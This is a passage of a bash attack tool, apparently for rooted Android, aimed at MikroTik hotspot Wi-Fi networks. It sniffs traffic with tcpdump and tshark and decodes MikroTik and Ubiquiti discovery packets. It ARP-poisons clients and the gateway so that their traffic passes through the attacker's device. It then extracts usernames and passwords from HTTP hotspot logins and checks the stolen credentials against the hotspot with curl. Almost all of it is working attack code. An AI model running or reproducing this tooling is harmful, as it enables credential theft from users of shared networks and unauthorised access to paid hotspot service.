																								i=0; ubnt=(0 0 0 0 0 0 0 0 0)
																								fields=(01 02 03 0a 0b 0c 0d 0e 10 14 18)
																							for c in "${fields[@]}"; do
																								if [ $c == 01 ]; then
																									remaining_payload="${remaining_payload/*01000?/}"
																								else
																									y="${remaining_payload#*${c}*}"
																									x="${remaining_payload/${c}${y}/}"
																									remaining_payload="${remaining_payload#*${c}????*}"
																									[[ $c =~ (0a|0c|0d|0e|18) ]] && x="${x//??/\\x&}"
																									[ $c == 10 ] && { [ "$x" = "02" ] && x="Station"; [ "$x" = "03" ] && x="Access-Point";  }
																									ubnt[$i]="$x"; i=$((i+1))
																								fi
																							done
																									return 0
																						}
																	local payload sender_mac receiver_mac sender_ip receiver_ip ndp
																	payload="$1"; sender_mac="$2"; receiver_mac="$3"; sender_ip="$4"; receiver_ip="$5"
																	_echo "\t\t_packet_process_ndp --> sender address: ${sender_ip} ${sender_mac}\n\t\t_packet_process_ndp --> receiver address: ${receiver_ip} ${receiver_mac}\n\t\t_packet_process_ndp --> payload: ${payload}" 0
																if [[ "$list_ndp" = *"$sender_mac"* ]] && [ -n "$list_ndp" ] && [ -n "$sender_mac"* ]; then
																	_echo "\t\t_packet_process_ndp --> skipping previous sender: ${sender_mac}" 0; return 1
																elif [ -z "$payload" ]; then
																	_echo "\t\t_packet_process_ndp --> error passed payload is null" 0; return 1
																elif [ ${#payload} -le 100 ]; then
																	_echo "\t\t_packet_process_ndp --> skipping dummy payload: ${payload}" 0; return 1
																elif [[ "$sender_ip" = "$devip"* ]] && [ -n "$sender_ip" ] && [ -n "$devip" ]; then
																	_echo "\t\t_packet_process_ndp --> skipping request payload: ${payload}" 0; return 1
																elif [ -n "$payload" ] || [ -n "$sender_ip" ] || [ -n "$sender_mac" ] || [ -n "$receiver_ip" ] || [ -n "$receiver_mac" ]; then
																	_echo "\t\t_packet_process_ndp --> parsing payload was successful" 0
																	list_ndp+=" $sender_mac"
																	list_ndp_db+="\"$payload\","
																else
																	_echo "\t\t_packet_process_ndp --> unexpected error while reading payload" 0; return 1
																fi

																if [[ "$receiver_ip" =~ (5678) ]]; then
																	_echo "\t\t_packet_process_ndp --> startting decoding mndp payload: ${receiver_ip}" 0
																	_parse_mndp "$payload" || return 1
																	_echo "\t\t_packet_process_ndp --> decoded mndp: [0](${mndp[0]}) [1](${mndp[1]}) [2](${mndp[2]}) [3](${mndp[3]}) [4](${mndp[4]}) [5](${mndp[5]}) [6](${mndp[6]}) [7](${mndp[7]})\n" 0
																	ndp=5678
																elif [[ "$receiver_ip" =~ (10002) ]]; then
																	_echo "\t\t_packet_process_ndp --> startting decoding ubnt payload: ${receiver_ip}" 0
																	_parse_ubnt "$payload" || return 1
																	_echo "\t\t_packet_process_ndp --> decoded ubnt: [0](${ubnt[0]}) [1](${ubnt[1]}) [2](${ubnt[2]}) [3](${ubnt[3]}) [4](${ubnt[4]}) [5](${ubnt[5]}) [6](${ubnt[6]}) [7](${ubnt[7]}) [8](${ubnt[8]}) [9](${ubnt[9]})" 0
																	ndp=10002
																else
																	_echo "\t\t_packet_process_ndp --> error could not idenify payload type: ${receiver_ip}" 0
																fi
																if [ "$capture_mode" = "1" ] || [ "$capture_mode" = "2" ]; then
																	_echo "\t\t_packet_process_ndp --> skipping mode is clients-mointoring" 0
																	return 1
																elif [ "$ndp" = "5678" ]; then
																	_echo "\t==============================\n\tDecoded MNDP Payload:\n\tGateway-IP: ${sender_ip}\n\tGateway-MAC: ${sender_mac}\n\tIdenity: ${mndp[0]}\n\tVersion: ${mndp[1]}\n\tPlatform: ${mndp[2]}\n\tUptime: ${mndp[3]}\n\tSoftware-ID: ${mndp[4]}\n\tBoard: ${mndp[5]}\n\tUnpacked: ${mndp[6]}\n\tInterface: ${mndp[7]}" 1
																elif [ "$ndp" = "10002" ]; then
																	_echo "\t==============================\n\tDecoded UBNT Payload:\n\tGateway-IP: ${sender_ip}\n\tGateway-MAC: ${sender_mac}\n\tMAC-Address: ${ubnt[0]}\n\tIP-Address: ${ubnt[1]}\n\tFW: ${ubnt[2]}\n\tUptime: ${ubnt[3]}\n\tHostname: ${ubnt[4]}\n\tPlatform: ${ubnt[5]}\n\tESSID: ${ubnt[6]}\n\tWireless-Mode: ${ubnt[7]}\n\tSystem-ID: ${ubnt[8]}\n\tModel: ${ubnt[9]}" 1
																fi
																	return 0
															}
											_packet_process_creds()
															{
																		_validate_creds()
																						{
																								local response mikrotik_response
																								mikrotik_response[0]="not found"
																								mikrotik_response[1]="no valid profile found"
																								mikrotik_response[2]="invalid username or password"
																								mikrotik_response[3]="invalid password"
																								mikrotik_response[4]="transfer limit reached"
																								mikrotik_response[5]="simultaneous session limit reached"
																								mikrotik_response[6]="uptime limit reached"
																								mikrotik_response[7]="user .* has reached traffic limit"
																								mikrotik_response[8]="no more sessions are allowed for user .*"
																								mikrotik_response[9]="user .* is not allowed to log in from this MAC address"
																								mikrotik_response[10]="radius timeout"
																								mikrotik_response[11]="invalid Calling-Station-Id"
																								mikrotik_response[12]="access denied at this time"
																								_echo "\t\t_validate_creds --> validating credits (${1}): ${2}" 0
																								response="$(curl -sLA "${ua}" -X "${1}" "${2}" | tr -d '\r\n')"
																								_echo "_validate_creds --> mikrotik response: ${response}" 0
																							if [ -z "$response" ]; then
																								return 1
																							elif [[ "$response" =~ "${mikrotik_response[0]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[0]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[1]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[1]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[2]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[2]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[3]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[3]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[4]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[4]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[5]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[5]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[6]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[6]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[7]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[7]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[8]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[8]}" 1; return 0
																							elif [[ "$response" =~ "${mikrotik_response[9]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[9]}" 1; return 0
																							elif [[ "$response" =~ "${mikrotik_response[10]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[10]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[11]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[11]}" 1; return 1
																							elif [[ "$response" =~ "${mikrotik_response[12]}" ]]; then
																								_echo "\tMikrotik response: ${mikrotik_response[12]}" 1; return 1
																							elif [[ "$response" =~ "status" ]]; then
																								return 0
																							else
																								return 1
																							fi
																						}
																	local x arr creds sender_mac receiver_mac sender_ip receiver_ip form value
																	_echo "\t\t_packet_process_creds --> processing credits: ${1}" 0
																	x="$1"; arr=($x)
																	sender_mac="$2"; receiver_mac="$3"; sender_ip="$4"; receiver_ip="$5"
																if [ -z "$max_creds" ]; then
																	#_echo "\t\t_packet_process_creds --> skipping creds since parse mode is running: ${x}" 0; return 1
																	max_creds=0
																fi
																if [ "$sender_mac" = "${addr[2]}" ] && [ -n "$sender_mac" ] && [ -n "${addr[2]}" ]; then
																	_echo "\t\t_packet_process_creds --> skipping your device creds: ${addr[2]}" 0; return 1
																elif [ ${max_creds} -ge 2 ] || [ -f "${home_dir}/logs/creds_${obf_date}.log" ]; then
																	_echo "\tExceedded max allowed creds: ${max_creds}\n\tUse this feature again after 24 hours" 1
																	echo -n>"${home_dir}/logs/creds_${obf_date}.log"; return 1
																fi

																if [ "${arr[0]}" = "GET" ] && [[ "${arr[1]}" =~ "/login?username" ]]; then
																	x="${arr[1]}"; x="${x/*\/login?username=/ }"; x="${x/&password=/ }"; x="${x/\&*/ }"; creds=($x)
																	[ -z "${creds[1]}" ] && creds[1]="none"
																	[[ "$list_creds" = *"${creds[0]}"* ]] && [ -n "${creds[0]}" ] && { _echo "\t\t_packet_process_creds --> skipping previous creds: ${creds[0]}"; return 1; }
																		if [ "$capture_mode" = "2" ] && [ $max_creds -ge 0 ]; then
																			{ max_creds=$((max_creds+1)); list_clients+=" ${sender_mac}"; }
																		fi
																elif [ "${arr[0]}" = "POST" ] && [[ "${arr[1]}" =~ "/login" ]]; then
																	x="${arr[2]//,,/,none,}"; x="${x//,/ }"; form=($x)
																	x="${arr[3]//,,/,none,}"; x="${x//,/ }"; value=($x)
																			creds=(${value[@]})
																			#x="${arr[1]}?${form[0]}=${value[0]}&${form[1]}=${value[1]}&${form[2]}=${value[2]}&${form[3]}=${value[3]}&${form[4]}=${value[4]}"
																		if [ "$capture_mode" = "2" ] && [ $max_creds -ge 0 ]; then
																			{ max_creds=$((max_creds+1)); list_clients+=" ${sender_mac}"; }
																		fi
																else
																	_echo "\t\t_packet_process_creds --> unexpected tcp content: ${x}" 0; return 1
																fi
																	_echo "\t==============================\n\tUser-IP-Address: ${sender_ip}\n\tUser-MAC-Address: ${sender_mac}\n\tUsername: ${creds[0]}\n\tPassword: ${creds[1]}" 1
																	timeout -k2 2 play-audio "$home_dir/sfx/notification_done.m4a" &
															}
										_configure_arppoison()
															{
																if [ "${iface}" = "0" ] || [ "${gateway}" = "0" ] || [ "${addr[2]}" = "0" ]; then
																	_echo "\tCannot read required poisonning fields" 1; return 1
																fi
																	gateway_mac=$(su -c ''${prefix}'/arping -rC1 '$gateway' 2>/dev/null')
																	[ -z "$gateway_mac" ] && \
																		{ _echo "\tCannot read gateway mac" 1; return 1; }

																	su -c 'echo '1' >/proc/sys/net/ipv4/ip_forward 2>/dev/null'
																	su -c 'sysctl net.ipv4.ip_forward=1 &>/dev/null'
																	su -c 'ip rule add from all lookup main pref 1 2>/dev/null'
																	su -c 'iptables -F -t filter 2>/dev/null'
																	su -c 'iptables -P FORWARD ACCEPT 2>/dev/null'
																	# IntercepterNG rules
																	#iptables -F; iptables -X; iptables -t nat -F; iptables -t nat -X; iptables -t mangle -F; iptables -t mangle -X
																	#iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -P OUTPUT ACCEPT
																	#echo "0" >/proc/sys/net/ipv4/conf/all/send_redirects
																	#sysctl net.ipv4.conf.all.send_redirects=0 >/dev/null
																	#echo "0" >/proc/sys/net/ipv4/conf/wlan0/send_redirects
																	#sysctl net.ipv4.conf.wlan0.send_redirects=0 >/dev/null

																	# makes devices confuse so they can ask faster
																	su -c 'sleep 3 && timeout -k3 3 '${prefix}'/arp-poison '$iface' '$gateway' '${addr[2]}' 'ff:ff:ff:ff:ff:ff' >/dev/null 2>&1' &
																	max_creds=0
															}
											_packet_process_arp()
															{
																		_arppoison_bg()
																						{
																							# dummy0: tell cc:cc:cc:bb:bb:bb that 192.168.1.2 is at ff:ff:ff:bb:bb:bb
																							# arp-poison dummy0 192.168.1.2 ff:ff:ff:bb:bb:bb cc:cc:cc:bb:bb:bb
																								local target_ip target_mac
																								target_ip="$1"
																								target_mac="$2"
																							if [ -z "${addr[2]}" ]; then
																								_echo "\t\t_arppoison_bg --> error cannot perform arp-poison missing: addr[2]" 0; return 1
																							elif [ -n "$debug_arppoison_target" ]; then
																								if [ "$debug_arppoison_target" = "${target}" ]; then
																									_echo "\t\t_arppoison_bg --> target debug found: ${target}" 0
																								else
																									_echo "\t\t_arppoison_bg --> error current target does not match debug target: ${target} != ${debug_arppoison_target}" 0; return 1
																								fi
																							fi
																								_echo "\t\t_arppoison_bg --> poisoning target: ${target}" 0
																							{
																								su -c 'timeout -k2 2 '${prefix}'/arp-poison '$iface' '${gateway}' '${addr[2]}' '${target_mac}' >/dev/null 2>&1' &
																								su -c 'timeout -k2 2 '${prefix}'/arp-poison '$iface' '${gateway}' '${addr[2]}' '${target_mac}' >/dev/null 2>&1' &
																								su -c 'timeout -k2 2 '${prefix}'/arp-poison '$iface' '${gateway}' '${addr[2]}' '${target_mac}' >/dev/null 2>&1' &
																							} &
																							{
																								su -c 'timeout -k2 2 '${prefix}'/arp-poison '$iface' '${target_ip}' '${addr[2]}' '${gateway_mac}' >/dev/null 2>&1' &
																								su -c 'timeout -k2 2 '${prefix}'/arp-poison '$iface' '${target_ip}' '${addr[2]}' '${gateway_mac}' >/dev/null 2>&1' &
																								su -c 'timeout -k2 2 '${prefix}'/arp-poison '$iface' '${target_ip}' '${addr[2]}' '${gateway_mac}' >/dev/null 2>&1' &
																							} &
																						}
																	local sender_mac receiver_mac sender_ip receiver_ip reply_mac target_route arr
																if [ "$1" = "Request" ]; then
																	{ sender_mac="$2"; receiver_mac="$3"; receiver_ip="$4"; sender_ip="$5"; }
																elif [ "$1" = "Reply" ]; then
																	{ sender_mac="$2"; receiver_mac="$3"; sender_ip="$4"; reply_mac="$5"; receiver_ip="none"; }
																fi

																	[ -n "${route}" ] && { arr=(${route//\./ }); target_route="${arr[0]}.${arr[1]}.${arr[2]}"; }
																if [ "$sender_mac" = "${addr[2]}" ] || [ "$receiver_mac" = "${addr[2]}" ]; then
																	_echo "\t\t_packet_process_arp --> skipping your device: ${addr[2]}" 0; return 1
																elif [ "$sender_ip" = "$gateway" ] || [ "$receiver_ip" = "$gateway" ]; then
																	_echo "\t\t_packet_process_arp --> skipping gateway: ${gateway}" 0; return 1
																elif [[ "$list_clients" = *"$sender_mac"* ]] || [[ "$list_clients" = *"$receiver_mac"* ]]; then
																	_echo "\t\t_packet_process_arp --> skipping previous device" 0; return 1
																elif [ "$sender_mac" = "ff:ff:ff:ff:ff:ff" ] || [ "$receiver_mac" = "ff:ff:ff:ff:ff:ff" ]; then
																	_echo "\t\t_packet_process_arp --> skipping broadcast address" 0; return 1
																elif [ -n "${route}" ] && ([[ ! "$sender_mac" =~ "${target_route}" ]] || [[ ! "$receiver_mac" =~ "${target_route}" ]]); then
																	_echo "\t\t_packet_process_arp --> skipping different route" 0; return 1
																elif [ "$capture_mode" = "2" ] && [ "$1" = "Request" ]; then
																	_arppoison_bg "${sender_ip}" "${sender_mac}"
																	_arppoison_bg "${receiver_ip}" "${receiver_mac}"
																	return 1
																elif [ "$capture_mode" = "2" ] && [ "$1" = "Reply" ]; then
																	_arppoison_bg "${sender_ip}" "${sender_mac}"
																	return 1
																fi

																	list_clients+=" $sender_mac"
																	list_clients+=" $receiver_mac"
																	clients+=" ${sender_mac} ${receiver_mac}"
																if [ "$capture_mode" = "3" ]; then
																	_echo "\t\t_process_tcpdump --> skipping since mode is ndp" 0
																	return 0
																else
																	_echo "\t==============================\n\tOpcode: ${1}\n\t${1} time: $(date +%r)\n\tIP-Address: ${sender_ip}\n\tMAC-Address: ${sender_mac}" 1
																	_echo "\t==============================\n\tOpcode: ${1}\n\t${1} time: $(date +%r)\n\tIP-Address: ${receiver_ip}\n\tMAC-Address: ${receiver_mac}" 1
																fi
															}
											_packet_process_dhcp()
															{
																	local sender_mac receiver_mac sender_ip receiver_ip
																if [ "$1" = "Request" ]; then
																		{ sender_mac="$2"; receiver_mac="$3"; sender_ip="$4"; receiver_ip="$5"; }
																	if [[ "$list_clients" = *"$sender_mac"* ]]; then
																		_echo "\t\t_packet_process_dhcp --> skipping previous device: $sender_mac" 0; return 1
																	else
																		clients+=" $sender_mac"
																	fi
																elif [ "$1" = "Reply" ]; then
																		{ sender_mac="$2"; receiver_mac="$3"; sender_ip="$4"; receiver_ip="$5"; }
																	if [[ "$list_clients" = *"$receiver_mac"* ]]; then
																		_echo "\t\t_packet_process_dhcp --> skipping previous device: $sender_mac" 0; return 1
																	else
																		list_clients+=" $receiver_mac"
																	fi
																fi
																if [ "$capture_mode" = "3" ]; then
																	_echo "\t\t_process_tcpdump --> skipping since mode is ndp" 0
																	return 0
																elif [ "$1" = "Request" ]; then
																	_echo "\t==============================\n\tOpcode: ${1}\n\t${1} time: $(date +%r)\n\tIP-Address: $sender_ip\n\tMAC-Address: $sender_mac" 1
																elif [ "$1" = "Reply" ]; then
																	_echo "\t==============================\n\tOpcode: ${1}\n\t${1} time: $(date +%r)\n\tIP-Address: $sender_ip\n\tMAC-Address: $sender_mac" 1
																fi
															}
													local traffic capture_mode filters tcpdump x u arr err header payload list_clients list_creds list_ndp cur_bssid
													capture_mode="$1"
												if [[ "$capture_mode" =~ (1|2|3|4) ]]; then
														_echo "- Starting mointor mode:" 1
														[ "${mointor_option}" = "3" ] && { _process_ping6 "mointor"; return 0; }
														stdin="${home_dir}/logs/${iwbssid[1]//:/}_${bot_date}.pcap"
														tcpdump="$prefix/tcpdump -i ${iface} --print -#netqNlUw"
														filters="arp or (port 67 or port 68) or (tcp and dst port 80) or (udp and dst 255.255.255.255 and port 5678 or port 10001 or port 10002)"
													if [ "$capture_mode" = "1" ]; then
														unset list_clients clients
													elif [ "$capture_mode" = "2" ]; then
														_configure_arppoison || return 1
														unset list_clients clients
													elif [ "$capture_mode" = "4" ]; then
														_configure_ndp || return 1
														unset list_ndp
													fi
												else
														_echo "- Parsing from pcap:" 2
														capture_mode=0
														tcpdump="$prefix/tcpdump -#netqNr"
														unset filters
												fi
											while read -r x; do
													arr=($x)
													clients+=" ${list_clients}"
												if [[ "$capture_mode" =~ (1|2|3) ]]; then
														cur_bssid="$(su -c ''${prefix}'/iw dev '${iface}' link 2>&1 | '${prefix}'/grep -Po '\''Connected to \K[^ ]*'\''')"
													if [ -n "$cur_bssid" ] && [ "${iwbssid[1]}" != "$cur_bssid" ]; then
														_echo "- Terminated to prevent network conflicts" 1
														return 1
													fi
												fi
												if [ "${arr[7]}" = "Request" ] && [ "${arr[10]}" = "tell" ]; then
														_echo "_process_tcpdump --> current packet is arp-request: ${x}" 0
														unset header
														header=("${arr[1]}" "${arr[3]/,/}" "${arr[9]}" "${arr[11]/,/}")
														_packet_process_arp "${arr[7]}" ${header[@]}
												elif [ "${arr[7]}" = "Reply" ] && [ "${arr[9]}" = "is-at" ]; then
														_echo "_process_tcpdump --> current packet is arp-reply: ${x}" 0
														unset header
														header=("${arr[1]}" "${arr[3]/,/}" "${arr[8]}" "${arr[10]/,/}")
														_packet_process_arp "${arr[7]}" ${header[@]}
												elif [ "${arr[7]}" = "Request" ] && [ "${arr[11]}" = "tell" ]; then
														_echo "_process_tcpdump --> current packet is arp-request: ${x}" 0
														unset header
														header=("${arr[1]}" "${arr[3]/,/}" "${arr[9]}" "${arr[12]/,/}")
														_packet_process_arp "${arr[7]}" ${header[@]}
												elif [ "${arr[7]}" = "0.0.0.0.68" ]; then
														_echo "_process_tcpdump --> current packet is dhcp-request: ${x}" 0
														unset header
														header=("${arr[1]}" "${arr[3]/,/}" "${arr[7]}" "${arr[9]/:/}")
														_packet_process_dhcp "Request" ${header[@]}
												elif [[ "${arr[7]}" =~ (.*67) ]] && [[ "${arr[9]}" =~ (.*68:) ]]; then
														_echo "_process_tcpdump --> current packet is dhcp-reply: ${x}" 0
														unset header
														header=("${arr[1]}" "${arr[3]/,/}" "${arr[7]}" "${arr[9]/:/}")
														_packet_process_dhcp "Reply" ${header[@]}
												elif [[ "$x" =~ (80: tcp) ]] && [ ${arr[11]} -ge 1 ]; then
														_echo "_process_tcpdump --> current packet is tcp: ${x}" 0
														header=("${arr[1]}" "${arr[3]/,/}" "${arr[7]}" "${arr[9]/:/}")
														payload="$(tshark -Tfields -e http.request.method -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value -r "$stdin" "frame.number==${arr[0]}" 2>/dev/null)"
														_packet_process_creds "${payload}" ${header[@]}
												elif [[ "$x" =~ (5678: UDP|10001: UDP|10002: UDP) ]]; then
														_echo "_process_tcpdump --> current packet is ndp: ${x}" 0
														unset header payload
														header=("${arr[1]}" "${arr[3]/,/}" "${arr[7]}" "${arr[9]/:/}")
														_echo "_process_tcpdump --> dumping current packet frame: ${arr[0]}" 0
														payload="$(tshark --hexdump noascii -r "$stdin" "frame.number==${arr[0]}" 2>/dev/null | awk '{$1=""; print $0}' | tr -d '\n ')"
														_packet_process_ndp "${payload}" ${header[@]}
												else
													if [[ "$x" =~ (tcpdump: listening on|reading from file) ]]; then
															_echo "\t\t_process_tcpdump --> skipping dummy text: ${x}" 0; continue
													elif [[ "$x" =~ (truncated dump file) ]]; then
														if [ -s "$home_dir/logs/err" ]; then
																err="$(cat $home_dir/logs/err)"
																echo -n >"$home_dir/logs/err"
															if [[ "$err" =~ (not permitted|denied|failed|Bad system call|failed) ]]; then
																_echo "Error cannot start mointor mode.\nTip: Try again with sudo" 1; return 1
															elif [[ "$err" =~ (No such device exists|That device is not up) ]]; then
																_echo "Error selected interface is invalid: $iface\nTip: Select a valid interface and try again" 1; return 1
															elif [ -n "$err" ]; then
																_echo "\t\t_process_tcpdump --> unexpected return: ${err}" 0; return 1
															fi
																unset err
														fi
													else
														# fixes memory overloading 
														[ "$mode" = "parse" ] && _echo "\t\t_process_tcpdump --> current packet is unknown: ${x}" 0; continue
													fi
												fi
											done< <(su -c $''${tcpdump}' '${stdin}' '\'' '${filters}' '\'' 2>&1')
										}

cmd_wifi_args="-d"
color_success='\033[0;92m'
color_reset='\033[0m'
color_error='\033[1;91m'
color_warn='\033[1;93m'
color_tip='\033[1;93m'
color_new='\033[1;96m'
_process_config "$@"
